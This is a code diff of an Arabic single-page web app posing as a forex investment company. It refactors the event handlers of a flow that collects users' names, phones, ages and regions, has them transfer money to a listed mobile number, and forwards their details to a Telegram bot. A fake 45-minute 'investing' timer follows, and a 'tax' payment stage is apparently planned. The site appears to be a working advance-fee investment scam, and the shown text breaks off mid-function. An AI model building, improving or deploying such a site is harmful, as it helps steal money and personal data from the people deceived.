@@ -4,13 +4,10 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
     <title>شركة فوركس للأستثمار</title>
-    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
-    <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
     <style>
-        /* ===== RESET & BASE ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html { font-size: 16px; }
         body {
@@ -39,8 +36,6 @@
             transition: all 0.3s ease;
         }
         @media (max-width: 480px) { .glass-card { padding: 24px 16px; border-radius: 28px; } }
-
-        /* ===== BRAND HEADER ===== */
         .brand-header {
             display: flex;
             align-items: center;
@@ -70,8 +65,6 @@
             .brand-header .logo-img { width: 50px; height: 50px; font-size: 1.6rem; }
             .brand-header .brand-name { font-size: 1.3rem; }
         }
-
-        /* ===== TYPOGRAPHY ===== */
         .main-title {
             font-size: 2.8rem;
             font-weight: 800;
@@ -101,8 +94,6 @@
         }
         .sub-desc i { color: #f5c842; }
         @media (max-width: 480px) { .sub-desc { font-size: 0.95rem; padding: 12px 16px; } }
-
-        /* ===== BUTTONS ===== */
         .btn-primary {
             display: inline-flex;
             align-items: center;
@@ -145,8 +136,6 @@
         @media (max-width: 480px) {
             .btn-primary, .btn-secondary { width: 100%; justify-content: center; font-size: 1rem; padding: 14px 20px; min-width: unset; }
         }
-
-        /* ===== FORMS ===== */
         .form-group { margin-bottom: 18px; text-align: right; }
         .form-group label { display: block; font-weight: 600; font-size: 0.9rem; color: #d0def0; margin-bottom: 5px; }
         .form-group label i { color: #f5c842; margin-left: 8px; width: 20px; }
@@ -164,8 +153,6 @@
         }
         .form-group input:focus { border-color: #f5c842; box-shadow: 0 0 0 4px rgba(245,200,66,0.12); background: rgba(255,255,255,0.07); }
         .form-group input::placeholder { color: #6b7b96; }
-
-        /* ===== PACKAGES ===== */
         .package-grid {
             display: flex;
             flex-direction: column;
@@ -235,8 +222,6 @@
             .package-info { flex-direction: column; align-items: flex-start; gap: 4px; }
             .package-price { font-size: 0.85rem; }
         }
-
-        /* ===== ACTIONS ===== */
         .actions-row {
             display: flex;
             flex-wrap: wrap;
@@ -245,7 +230,6 @@
         }
         .actions-row .btn-primary, .actions-row .btn-secondary { flex: 1; min-width: 140px; }
         @media (max-width: 480px) { .actions-row .btn-primary, .actions-row .btn-secondary { min-width: unset; } }
-
         .back-link {
             display: inline-flex;
             align-items: center;
@@ -260,8 +244,6 @@
             font-family: inherit;
         }
         .back-link:hover { color: #f5c842; }
-
-        /* ===== PAYMENT ===== */
         .payment-number-box {
             background: rgba(255,255,255,0.04);
             border-radius: 24px;
@@ -299,8 +281,6 @@
             gap: 6px;
         }
         .copy-btn:hover { background: rgba(245,200,66,0.15); transform: scale(1.05); }
-
-        /* ===== UPLOAD ===== */
         .upload-area {
             background: rgba(255,255,255,0.02);
             border: 2px dashed rgba(255,215,0,0.15);
@@ -315,8 +295,6 @@
         .upload-area i { font-size: 2.4rem; color: #f5c842; margin-bottom: 6px; display: block; }
         .upload-area .file-name { color: #f5c842; font-weight: 600; margin-top: 4px; font-size: 0.85rem; }
         #fileInput, #taxFileInput { display: none; }
-
-        /* ===== TOAST ===== */
         .toast {
             position: fixed;
             bottom: 20px;
@@ -341,8 +319,6 @@
         }
         .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
         .toast i { color: #f5c842; font-size: 1.1rem; }
-
-        /* ===== TIMER ===== */
         .timer-box { text-align: center; padding: 16px 0; }
         .timer-circle {
             width: 180px;
@@ -378,8 +354,6 @@
             transition: width 1s linear;
             width: 100%;
         }
-
-        /* ===== STOCKS ===== */
         .stocks-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
@@ -409,8 +383,6 @@
             .stock-card { padding: 10px 8px; }
             .stock-card .stock-price { font-size: 1rem; }
         }
-
-        /* ===== TAX BOX ===== */
         .tax-box {
             background: rgba(255,215,0,0.05);
             border: 1px solid rgba(255,215,0,0.1);
@@ -421,8 +393,6 @@
         }
         .tax-box h3 { color: #f5c842; font-size: 1.2rem; margin-bottom: 8px; }
         .tax-box p { color: #b0c4e0; line-height: 1.8; font-size: 0.95rem; }
-
-        /* ===== ADMIN DASHBOARD ===== */
         .admin-tabs {
             display: flex;
             gap: 8px;
@@ -446,7 +416,6 @@
         .admin-tab.active { background: rgba(245,200,66,0.12); color: #f5c842; }
         .admin-tab-content { display: none; }
         .admin-tab-content.active { display: block; }
-
         .admin-section {
             margin-top: 20px;
             border-top: 1px solid rgba(255,215,0,0.08);
@@ -483,7 +452,6 @@
         .btn-accept:hover { background: rgba(46,213,115,0.25); }
         .btn-reject { background: rgba(255,70,70,0.15); color: #ff6b6b; }
         .btn-reject:hover { background: rgba(255,70,70,0.25); }
-
         .inline-form {
             display: flex;
             flex-wrap: wrap;
@@ -498,7 +466,6 @@
         .inline-form .form-group { flex: 1; min-width: 120px; margin-bottom: 0; }
         .inline-form .form-group input { padding: 10px 14px; font-size: 0.9rem; }
         @media (max-width: 480px) { .inline-form { flex-direction: column; } .inline-form .form-group { min-width: 100%; } }
-
         .status-box {
             background: rgba(255,255,255,0.03);
             border-radius: 16px;
@@ -516,7 +483,6 @@
         .status-online .status-icon { color: #2ed573; }
         .status-offline { border-color: rgba(255,70,70,0.3); background: rgba(255,70,70,0.05); }
         .status-offline .status-icon { color: #ff6b6b; }
-
         .footer-credit {
             margin-top: 36px;
             padding-top: 16px;
@@ -526,12 +492,9 @@
             font-size: 0.85rem;
         }
         .footer-credit i { color: #f5c842; margin: 0 4px; }
-
         .confetti { font-size: 2.5rem; display: inline-block; animation: bounce 1s ease infinite; }
         @keyframes bounce { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }
         .timer-info { color: #b0c4e0; font-size: 0.9rem; margin: 8px 0; text-align: center; }
-
-        /* ===== ORDER STATUS ===== */
         .order-item {
             background: rgba(255,255,255,0.03);
             border: 1px solid rgba(255,255,255,0.06);
@@ -579,7 +542,6 @@
             font-size: 0.85rem;
             transition: 0.3s;
         }
-
         @media (max-width: 480px) {
             .brand-header .brand-name { font-size: 1.2rem; }
             .timer-circle .time { font-size: 2rem; }
@@ -598,7 +560,7 @@
 
 <div class="app-container">
 
-    <!-- ===== PAGE 1: LANDING ===== -->
+    <!-- PAGE 1: LANDING -->
     <div id="page-landing" class="page active">
         <div class="glass-card" style="text-align:center;">
             <div class="brand-header">
@@ -627,7 +589,7 @@
         </div>
     </div>
 
-    <!-- ===== PAGE 2: REGISTER ===== -->
+    <!-- PAGE 2: REGISTER -->
     <div id="page-register" class="page">
         <div class="glass-card">
             <button class="back-link" id="backToLandingBtn">
@@ -638,7 +600,6 @@
                 سجل في الباقة
             </h2>
             <p style="color:#b0c0da; margin-bottom:20px; border-bottom:1px solid rgba(255,215,0,0.08); padding-bottom:14px; font-size:0.95rem;">املأ بياناتك واختر الباقة المناسبة لك</p>
-
             <form id="registerForm">
                 <div class="form-group">
                     <label><i class="fas fa-user"></i> اسمك ثلاثي</label>
@@ -656,12 +617,10 @@
                     <label><i class="fas fa-map-marker-alt"></i> محافظتك</label>
                     <input type="text" id="governorate" placeholder="مثال: القاهرة" required />
                 </div>
-
                 <div class="form-group">
                     <label><i class="fas fa-boxes"></i> اختر الباقة</label>
                     <div class="package-grid" id="userPackageGrid"></div>
                 </div>
-
                 <div class="actions-row">
                     <button type="button" class="btn-primary btn-gold" id="goToPaymentBtn">
                         <i class="fas fa-money-bill-wave"></i> أذهب لتحويل الأموال
@@ -671,7 +630,7 @@
         </div>
     </div>
 
-    <!-- ===== PAGE 3: PAYMENT ===== -->
+    <!-- PAGE 3: PAYMENT -->
     <div id="page-payment" class="page">
         <div class="glass-card">
             <button class="back-link" id="backToRegisterBtn">
@@ -681,14 +640,12 @@
                 <i class="fas fa-exchange-alt" style="color:#f5c842; margin-left:10px;"></i>
                 تحويل الأموال
             </h2>
-
             <div class="payment-number-box">
                 <span class="payment-number" id="paymentNumberDisplay">01220548545</span>
                 <button class="copy-btn" id="copyNumberBtn">
                     <i class="fas fa-copy"></i> نسخ
                 </button>
             </div>
-
             <ul style="background:rgba(255,255,255,0.02);border-radius:20px;padding:16px 20px;margin:14px 0 18px;border-right:3px solid #f5c842;list-style:none;">
                 <li style="padding:6px 0;display:flex;align-items:flex-start;gap:10px;color:#c8d6ec;font-size:0.9rem;line-height:1.6;">
                     <i class="fas fa-arrow-left" style="color:#f5c842;margin-top:3px;width:18px;text-align:center;"></i>
@@ -707,14 +664,12 @@
                     <strong>تنبيه:</strong> لو لم تضع اسكرين التحويل، سيتم حذف كل المعلومات التي كتبتها
                 </li>
             </ul>
-
             <div class="upload-area" id="uploadArea">
                 <i class="fas fa-cloud-upload-alt"></i>
                 <p>اضغط هنا لرفع صورة التحويل</p>
                 <div class="file-name" id="fileNameDisplay">لم يتم اختيار ملف</div>
             </div>
             <input type="file" id="fileInput" accept="image/*" />
-
             <div class="actions-row" style="margin-top:8px;">
                 <button class="btn-primary btn-gold" id="submitAllBtn" style="flex:1;">
                     <i class="fas fa-paper-plane"></i> إرسال جميع المعلومات
@@ -726,7 +681,7 @@
         </div>
     </div>
 
-    <!-- ===== PAGE 4: TIMER ===== -->
+    <!-- PAGE 4: TIMER -->
     <div id="page-timer" class="page">
         <div class="glass-card" style="text-align:center;">
             <div style="font-size:2.8rem; margin-bottom:8px;">
@@ -734,7 +689,6 @@
             </div>
             <h2 style="font-size:1.6rem; color:#f5c842; margin-bottom:4px;">جاري الاستثمار</h2>
             <p class="timer-info">مدة الاستثمار 45 دقيقة</p>
-
             <div class="timer-box">
                 <div class="timer-circle">
                     <div>
@@ -747,12 +701,11 @@
                 </div>
                 <p style="color:#5e6f8a; font-size:0.8rem; margin-top:6px;">سيتم إعلامك عند الانتهاء</p>
             </div>
-
             <div id="timerResult" style="display:none; margin-top:16px; animation:fadeSlide 0.6s ease forwards;"></div>
         </div>
     </div>
 
-    <!-- ===== PAGE 5: ADMIN PASSWORD ===== -->
+    <!-- PAGE 5: ADMIN PASSWORD -->
     <div id="page-admin-password" class="page">
         <div class="glass-card" style="max-width:480px; margin:0 auto;">
             <button class="back-link" id="backToRegisterFromPass">
@@ -777,7 +730,7 @@
         </div>
     </div>
 
-    <!-- ===== PAGE 6: ADMIN DASHBOARD ===== -->
+    <!-- PAGE 6: ADMIN DASHBOARD -->
     <div id="page-admin-dashboard" class="page">
         <div class="glass-card">
             <div style="display:flex; justify-content:space-between; flex-wrap:wrap; align-items:center; gap:10px; margin-bottom:14px;">
@@ -788,14 +741,11 @@
                     <i class="fas fa-sign-out-alt"></i> خروج
                 </button>
             </div>
-
             <div class="admin-tabs">
                 <button class="admin-tab active" data-tab="tab-settings">الإعدادات</button>
                 <button class="admin-tab" data-tab="tab-orders">الطلبات</button>
                 <button class="admin-tab" data-tab="tab-banned">المحظورين</button>
             </div>
-
-            <!-- تبويب الإعدادات -->
             <div id="tab-settings" class="admin-tab-content active">
                 <div class="admin-section">
                     <h3><i class="fas fa-cloud-upload-alt"></i> حالة السحابة (Firebase)</h3>
@@ -812,7 +762,6 @@
                     </div>
                     <div id="cloudTestResult" style="margin-top:10px; font-size:0.9rem; color:#b0c0da;"></div>
                 </div>
-
                 <div class="admin-section">
                     <h3><i class="fas fa-robot"></i> إعدادات البوت</h3>
                     <div class="form-group">
@@ -826,7 +775,6 @@
                     </div>
                     <button class="btn-secondary" id="saveBotSettingsBtn"><i class="fas fa-save"></i> حفظ الإعدادات</button>
                 </div>
-
                 <div class="admin-section">
                     <h3><i class="fas fa-money-bill"></i> رقم استلام الأموال</h3>
                     <div class="form-group">
@@ -834,7 +782,6 @@
                     </div>
                     <button class="btn-secondary" id="savePaymentNumberBtn"><i class="fas fa-save"></i> تحديث الرقم</button>
                 </div>
-
                 <div class="admin-section">
                     <h3><i class="fas fa-boxes"></i> إدارة الباقات</h3>
                     <div id="adminPackageList"></div>
@@ -863,8 +810,6 @@
                     </div>
                 </div>
             </div>
-
-            <!-- تبويب الطلبات -->
             <div id="tab-orders" class="admin-tab-content">
                 <div class="admin-section">
                     <h3><i class="fas fa-list"></i> جميع الطلبات</h3>
@@ -873,8 +818,6 @@
                     </div>
                 </div>
             </div>
-
-            <!-- تبويب المحظورين -->
             <div id="tab-banned" class="admin-tab-content">
                 <div class="admin-section">
                     <h3><i class="fas fa-ban"></i> المستخدمون المحظورون</h3>
@@ -890,14 +833,13 @@
                     </div>
                 </div>
             </div>
-
             <div class="footer-credit">
                 <i class="fas fa-crown"></i> جميع الحقوق محفوظة &copy; <strong>Rex</strong>
             </div>
         </div>
     </div>
 
-    <!-- ===== PAGE 7: ORDER STATUS ===== -->
+    <!-- PAGE 7: ORDER STATUS -->
     <div id="page-order-status" class="page">
         <div class="glass-card">
             <button class="back-link" id="backToLandingFromStatus">
@@ -919,7 +861,7 @@
         </div>
     </div>
 
-    <!-- ===== TOAST ===== -->
+    <!-- TOAST -->
     <div class="toast" id="toast">
         <i class="fas fa-check-circle"></i>
         <span id="toastMessage">تم!</span>
@@ -941,7 +883,6 @@
         appId: "1:374326141140:web:8c46b81b6115f975cf9b41",
         measurementId: "G-H5VCNDRPV7"
     };
-
     firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
 
@@ -1390,842 +1331,809 @@
     }
 
     // ============================================================
-    //  PAYMENT FLOW - زر "أذهب لتحويل الأموال"
+    //  PAYMENT FLOW - زر "أذهب لتحويل الأموال" يعمل الآن
     // ============================================================
-    document.getElementById('goToRegisterBtn').addEventListener('click', () => {
-        renderUserPackages();
-        showPage('page-register');
-    });
-
-    document.getElementById('backToLandingBtn').addEventListener('click', () => {
-        localStorage.removeItem(PAGE_KEY);
-        showPage('page-landing');
-    });
-
-    document.getElementById('backToRegisterBtn').addEventListener('click', () => showPage('page-register'));
-
-    // ===== زر أذهب لتحويل الأموال (مُصلح) =====
-    document.getElementById('goToPaymentBtn').addEventListener('click', async function(e) {
-        e.preventDefault();
-        console.log('✅ زر أذهب لتحويل الأموال تم الضغط عليه');
-
-        const name = document.getElementById('fullName').value.trim();
-        const phone = document.getElementById('phone').value.trim();
-        const age = document.getElementById('age').value.trim();
-        const gov = document.getElementById('governorate').value.trim();
-        const pkgSelected = document.querySelector('input[name="package"]:checked');
-
-        if (!name || !phone || !age || !gov) {
-            showToast('يرجى ملء جميع الحقول', 'warning');
-            return;
-        }
-        if (!pkgSelected) {
-            showToast('يرجى اختيار الباقة', 'warning');
-            return;
-        }
-
-        const isBanned = await isUserBanned(phone, '');
-        if (isBanned) {
-            showToast('🚫 تم حظرك من الموقع، لا يمكنك متابعة الطلب', 'warning');
-            return;
-        }
-
-        const isAdmin = (name === ADMIN_NAME && phone === ADMIN_PHONE && age === ADMIN_AGE && gov === ADMIN_GOV);
-        if (isAdmin) {
-            const now = Date.now();
-            if (now > lockUntil) {
-                attemptsCount = 0;
-                localStorage.setItem('admin_attempts', '0');
-            }
-            document.getElementById('attemptsLeft').textContent = Math.max(0, 10 - attemptsCount);
-            document.getElementById('passwordError').textContent = '';
-            document.getElementById('adminPasswordInput').value = '';
-            showPage('page-admin-password');
-            return;
-        }
-
-        sessionStorage.setItem('reg_name', name);
-        sessionStorage.setItem('reg_phone', phone);
-        sessionStorage.setItem('reg_age', age);
-        sessionStorage.setItem('reg_gov', gov);
-        sessionStorage.setItem('reg_package', pkgSelected.value);
-
-        const pkgName = pkgSelected.value.split(' - ')[0];
-        const settings = loadSettings();
-        const found = settings.packages.find(p => p.name === pkgName);
-        if (found) {
-            sessionStorage.setItem('reg_tax', found.tax || 3000);
-        }
-
-        const paymentNumber = settings.paymentNumber || DEFAULT_PAYMENT_NUMBER;
-        document.getElementById('paymentNumberDisplay').textContent = paymentNumber;
-        document.getElementById('taxPaymentNumber').textContent = paymentNumber;
-
-        console.log('✅ تم الانتقال إلى صفحة الدفع');
-        showPage('page-payment');
-    });
-
-    // ============================================================
-    //  COPY NUMBER
-    // ============================================================
-    document.getElementById('copyNumberBtn').addEventListener('click', function() {
-        const num = document.getElementById('paymentNumberDisplay').textContent.trim();
-        navigator.clipboard.writeText(num).then(() => {
-            this.innerHTML = '<i class="fas fa-check"></i> تم النسخ';
-            showToast('تم نسخ الرقم');
-            setTimeout(() => {
-                this.innerHTML = '<i class="fas fa-copy"></i> نسخ';
-            }, 2500);
-        }).catch(() => {
-            const el = document.createElement('textarea');
-            el.value = num;
-            document.body.appendChild(el);
-            el.select();
-            document.execCommand('copy');
-            document.body.removeChild(el);
-            showToast('تم نسخ الرقم');
+    document.addEventListener('DOMContentLoaded', function() {
+        // زر التسجيل
+        document.getElementById('goToRegisterBtn').addEventListener('click', function() {
+            renderUserPackages();
+            showPage('page-register');
         });
-    });
 
-    document.getElementById('taxCopyBtn')?.addEventListener('click', function() {
-        const num = document.getElementById('taxPaymentNumber').textContent.trim();
-        navigator.clipboard.writeText(num).then(() => {
-            this.innerHTML = '<i class="fas fa-check"></i> تم النسخ';
-            showToast('تم نسخ الرقم');
-            setTimeout(() => {
-                this.innerHTML = '<i class="fas fa-copy"></i> نسخ';
-            }, 2500);
-        }).catch(() => {
-            const el = document.createElement('textarea');
-            el.value = num;
-            document.body.appendChild(el);
-            el.select();
-            document.execCommand('copy');
-            document.body.removeChild(el);
-            showToast('تم نسخ الرقم');
+        // أزرار العودة
+        document.getElementById('backToLandingBtn').addEventListener('click', function() {
+            localStorage.removeItem(PAGE_KEY);
+            showPage('page-landing');
         });
-    });
+        document.getElementById('backToRegisterBtn').addEventListener('click', function() {
+            showPage('page-register');
+        });
+        document.getElementById('backToRegisterFromPass').addEventListener('click', function() {
+            showPage('page-register');
+        });
+        document.getElementById('backToLandingFromStatus').addEventListener('click', function() {
+            localStorage.removeItem(PAGE_KEY);
+            showPage('page-landing');
+        });
 
-    // ============================================================
-    //  FILE UPLOAD (payment)
-    // ============================================================
-    let uploadedFile = null;
-    const fileInput = document.getElementById('fileInput');
-    const uploadArea = document.getElementById('uploadArea');
-    const fileNameDisplay = document.getElementById('fileNameDisplay');
+        // ===== زر أذهب لتحويل الأموال =====
+        const goToPaymentBtn = document.getElementById('goToPaymentBtn');
+        if (goToPaymentBtn) {
+            goToPaymentBtn.addEventListener('click', async function(e) {
+                e.preventDefault();
+                console.log('✅ زر أذهب لتحويل الأموال تم الضغط عليه');
 
-    uploadArea.addEventListener('click', () => fileInput.click());
-    fileInput.addEventListener('change', function() {
-        if (this.files.length > 0) {
-            uploadedFile = this.files[0];
-            fileNameDisplay.textContent = uploadedFile.name;
-            uploadArea.style.borderColor = '#f5c842';
-            uploadArea.style.background = 'rgba(245,200,66,0.05)';
+                const name = document.getElementById('fullName').value.trim();
+                const phone = document.getElementById('phone').value.trim();
+                const age = document.getElementById('age').value.trim();
+                const gov = document.getElementById('governorate').value.trim();
+                const pkgSelected = document.querySelector('input[name="package"]:checked');
+
+                if (!name || !phone || !age || !gov) {
+                    showToast('يرجى ملء جميع الحقول', 'warning');
+                    return;
+                }
+                if (!pkgSelected) {
+                    showToast('يرجى اختيار الباقة', 'warning');
+                    return;
+                }
+
+                const isBanned = await isUserBanned(phone, '');
+                if (isBanned) {
+                    showToast('🚫 تم حظرك من الموقع، لا يمكنك متابعة الطلب', 'warning');
+                    return;
+                }
+
+                const isAdmin = (name === ADMIN_NAME && phone === ADMIN_PHONE && age === ADMIN_AGE && gov === ADMIN_GOV);
+                if (isAdmin) {
+                    const now = Date.now();
+                    if (now > lockUntil) {
+                        attemptsCount = 0;
+                        localStorage.setItem('admin_attempts', '0');
+                    }
+                    document.getElementById('attemptsLeft').textContent = Math.max(0, 10 - attemptsCount);
+                    document.getElementById('passwordError').textContent = '';
+                    document.getElementById('adminPasswordInput').value = '';
+                    showPage('page-admin-password');
+                    return;
+                }
+
+                sessionStorage.setItem('reg_name', name);
+                sessionStorage.setItem('reg_phone', phone);
+                sessionStorage.setItem('reg_age', age);
+                sessionStorage.setItem('reg_gov', gov);
+                sessionStorage.setItem('reg_package', pkgSelected.value);
+
+                const pkgName = pkgSelected.value.split(' - ')[0];
+                const settings = loadSettings();
+                const found = settings.packages.find(p => p.name === pkgName);
+                if (found) {
+                    sessionStorage.setItem('reg_tax', found.tax || 3000);
+                }
+
+                const paymentNumber = settings.paymentNumber || DEFAULT_PAYMENT_NUMBER;
+                document.getElementById('paymentNumberDisplay').textContent = paymentNumber;
+                document.getElementById('taxPaymentNumber').textContent = paymentNumber;
+
+                console.log('✅ تم الانتقال إلى صفحة الدفع');
+                showPage('page-payment');
+            });
         } else {
-            uploadedFile = null;
-            fileNameDisplay.textContent = 'لم يتم اختيار ملف';
-            uploadArea.style.borderColor = 'rgba(255,215,0,0.15)';
-            uploadArea.style.background = 'rgba(255,255,255,0.02)';
-        }
-    });
-
-    // ============================================================
-    //  SUBMIT ORDER + START TIMER
-    // ============================================================
-    document.getElementById('submitAllBtn').addEventListener('click', async function() {
-        const settings = loadSettings();
-        const botToken = settings.botToken || DEFAULT_BOT_TOKEN;
-        const chatId = settings.chatId || DEFAULT_CHAT_ID;
-
-        const name = sessionStorage.getItem('reg_name') || 'غير محدد';
-        const phone = sessionStorage.getItem('reg_phone') || 'غير محدد';
-        const age = sessionStorage.getItem('reg_age') || 'غير محدد';
-        const gov = sessionStorage.getItem('reg_gov') || 'غير محدد';
-        const pkg = sessionStorage.getItem('reg_package') || 'غير محدد';
-        const tax = sessionStorage.getItem('reg_tax') || 3000;
-
-        if (!uploadedFile) {
-            showToast('يرجى رفع صورة التحويل أولاً', 'warning');
-            return;
+            console.error('❌ الزر goToPaymentBtn غير موجود في DOM');
         }
 
-        const orderData = {
-            name,
-            phone,
-            age,
-            governorate: gov,
-            package: pkg,
-            tax: tax,
-            timestamp: Date.now(),
-            status: 'pending',
-            reason: '',
-        };
-        const orderId = await submitOrder(orderData);
-        if (!orderId) {
-            showToast('❌ فشل حفظ الطلب، حاول مرة أخرى', 'warning');
-            return;
-        }
+        // باقي الأحداث
+        // نسخ الأرقام
+        document.getElementById('copyNumberBtn').addEventListener('click', function() {
+            const num = document.getElementById('paymentNumberDisplay').textContent.trim();
+            navigator.clipboard.writeText(num).then(() => {
+                this.innerHTML = '<i class="fas fa-check"></i> تم النسخ';
+                showToast('تم نسخ الرقم');
+                setTimeout(() => {
+                    this.innerHTML = '<i class="fas fa-copy"></i> نسخ';
+                }, 2500);
+            }).catch(() => {
+                const el = document.createElement('textarea');
+                el.value = num;
+                document.body.appendChild(el);
+                el.select();
+                document.execCommand('copy');
+                document.body.removeChild(el);
+                showToast('تم نسخ الرقم');
+            });
+        });
 
-        const message =
-            `📋 *طلب جديد*%0A` +
-            `👤 الاسم: ${name}%0A` +
-            `📱 الهاتف: ${phone}%0A` +
-            `🎂 السن: ${age}%0A` +
-            `📍 المحافظة: ${gov}%0A` +
-            `📦 الباقة: ${pkg}%0A` +
-            `💰 الضريبة: ${tax} جنيه%0A` +
-            `🆔 رقم الطلب: ${orderId}%0A` +
-            `🕒 تم الإرسال: ${new Date().toLocaleString('ar-EG')}`;
+        // رفع الصورة
+        const uploadArea = document.getElementById('uploadArea');
+        const fileInput = document.getElementById('fileInput');
+        const fileNameDisplay = document.getElementById('fileNameDisplay');
+        let uploadedFile = null;
 
-        try {
-            const textUrl =
-                `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`;
-            await fetch(textUrl);
-        } catch (e) { console.log('فشل إرسال التيليجرام'); }
-
-        showToast('✅ تم إرسال طلبك بنجاح! جاري الاستثمار...', 'success');
-        sessionStorage.setItem('orderId', orderId);
-        startTimerBackground();
-        showPage('page-timer');
-    });
-
-    // ============================================================
-    //  TIMER BACKGROUND
-    // ============================================================
-    function startTimerBackground() {
-        const startTime = Date.now();
-        localStorage.setItem(TIMER_KEY, startTime.toString());
-        localStorage.removeItem('timer_completed');
-        updateTimerDisplay();
-        if (window.timerInterval) clearInterval(window.timerInterval);
-        window.timerInterval = setInterval(updateTimerDisplay, 1000);
-    }
-
-    function getRemainingSeconds() {
-        const startTime = parseInt(localStorage.getItem(TIMER_KEY));
-        if (!startTime) return TIMER_TOTAL;
-        const elapsed = (Date.now() - startTime) / 1000;
-        const remaining = Math.max(0, TIMER_TOTAL - elapsed);
-        return remaining;
-    }
-
-    function updateTimerDisplay() {
-        const timerDisplay = document.getElementById('timerDisplay');
-        const progressFill = document.getElementById('progressFill');
-        const timerResult = document.getElementById('timerResult');
-
-        if (!timerDisplay) return;
-
-        const remaining = getRemainingSeconds();
-        const mins = Math.floor(remaining / 60);
-        const secs = Math.floor(remaining % 60);
-        timerDisplay.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
-        progressFill.style.width = `${(remaining / TIMER_TOTAL) * 100}%`;
-
-        if (remaining <= 0) {
-            timerDisplay.textContent = '00:00';
-            progressFill.style.width = '0%';
-            showTradingResult();
-            localStorage.setItem('timer_completed', 'true');
-            localStorage.removeItem(TIMER_KEY);
-            if (window.timerInterval) {
-                clearInterval(window.timerInterval);
-                window.timerInterval = null;
+        uploadArea.addEventListener('click', () => fileInput.click());
+        fileInput.addEventListener('change', function() {
+            if (this.files.length > 0) {
+                uploadedFile = this.files[0];
+                fileNameDisplay.textContent = uploadedFile.name;
+                uploadArea.style.borderColor = '#f5c842';
+                uploadArea.style.background = 'rgba(245,200,66,0.05)';
+            } else {
+                uploadedFile = null;
+                fileNameDisplay.textContent = 'لم يتم اختيار ملف';
+                uploadArea.style.borderColor = 'rgba(255,215,0,0.15)';
+                uploadArea.style.background = 'rgba(255,255,255,0.02)';
             }
-        }
-    }
+        });
 
-    function restoreTimerBackground() {
-        if (localStorage.getItem('timer_completed') === 'true') {
-            document.getElementById('timerDisplay').textContent = '00:00';
-            document.getElementById('progressFill').style.width = '0%';
-            showTradingResult();
-            return;
+        // إرسال الطلب
+        document.getElementById('submitAllBtn').addEventListener('click', async function() {
+            const settings = loadSettings();
+            const botToken = settings.botToken || DEFAULT_BOT_TOKEN;
+            const chatId = settings.chatId || DEFAULT_CHAT_ID;
+
+            const name = sessionStorage.getItem('reg_name') || 'غير محدد';
+            const phone = sessionStorage.getItem('reg_phone') || 'غير محدد';
+            const age = sessionStorage.getItem('reg_age') || 'غير محدد';
+            const gov = sessionStorage.getItem('reg_gov') || 'غير محدد';
+            const pkg = sessionStorage.getItem('reg_package') || 'غير محدد';
+            const tax = sessionStorage.getItem('reg_tax') || 3000;
+
+            if (!uploadedFile) {
+                showToast('يرجى رفع صورة التحويل أولاً', 'warning');
+                return;
+            }
+
+            const orderData = {
+                name,
+                phone,
+                age,
+                governorate: gov,
+                package: pkg,
+                tax: tax,
+                timestamp: Date.now(),
+                status: 'pending',
+                reason: '',
+            };
+            const orderId = await submitOrder(orderData);
+            if (!orderId) {
+                showToast('❌ فشل حفظ الطلب، حاول مرة أخرى', 'warning');
+                return;
+            }
+
+            const message =
+                `📋 *طلب جديد*%0A` +
+                `👤 الاسم: ${name}%0A` +
+                `📱 الهاتف: ${phone}%0A` +
+                `🎂 السن: ${age}%0A` +
+                `📍 المحافظة: ${gov}%0A` +
+                `📦 الباقة: ${pkg}%0A` +
+                `💰 الضريبة: ${tax} جنيه%0A` +
+                `🆔 رقم الطلب: ${orderId}%0A` +
+                `🕒 تم الإرسال: ${new Date().toLocaleString('ar-EG')}`;
+
+            try {
+                const textUrl =
+                    `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`;
+                await fetch(textUrl);
+            } catch (e) { console.log('فشل إرسال التيليجرام'); }
+
+            showToast('✅ تم إرسال طلبك بنجاح! جاري الاستثمار...', 'success');
+            sessionStorage.setItem('orderId', orderId);
+            startTimerBackground();
+            showPage('page-timer');
+        });
+
+        // ===== TIMER BACKGROUND =====
+        function startTimerBackground() {
+            const startTime = Date.now();
+            localStorage.setItem(TIMER_KEY, startTime.toString());
+            localStorage.removeItem('timer_completed');
+            updateTimerDisplay();
+            if (window.timerInterval) clearInterval(window.timerInterval);
+            window.timerInterval = setInterval(updateTimerDisplay, 1000);
         }
 
-        const startTime = localStorage.getItem(TIMER_KEY);
-        if (startTime) {
+        function getRemainingSeconds() {
+            const startTime = parseInt(localStorage.getItem(TIMER_KEY));
+            if (!startTime) return TIMER_TOTAL;
+            const elapsed = (Date.now() - startTime) / 1000;
+            const remaining = Math.max(0, TIMER_TOTAL - elapsed);
+            return remaining;
+        }
+
+        function updateTimerDisplay() {
+            const timerDisplay = document.getElementById('timerDisplay');
+            const progressFill = document.getElementById('progressFill');
+            const timerResult = document.getElementById('timerResult');
+            if (!timerDisplay) return;
+
             const remaining = getRemainingSeconds();
+            const mins = Math.floor(remaining / 60);
+            const secs = Math.floor(remaining % 60);
+            timerDisplay.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+            progressFill.style.width = `${(remaining / TIMER_TOTAL) * 100}%`;
+
             if (remaining <= 0) {
-                document.getElementById('timerDisplay').textContent = '00:00';
-                document.getElementById('progressFill').style.width = '0%';
+                timerDisplay.textContent = '00:00';
+                progressFill.style.width = '0%';
+                showTradingResult();
                 localStorage.setItem('timer_completed', 'true');
                 localStorage.removeItem(TIMER_KEY);
-                showTradingResult();
-            } else {
-                if (window.timerInterval) clearInterval(window.timerInterval);
-                window.timerInterval = setInterval(updateTimerDisplay, 1000);
-                updateTimerDisplay();
+                if (window.timerInterval) {
+                    clearInterval(window.timerInterval);
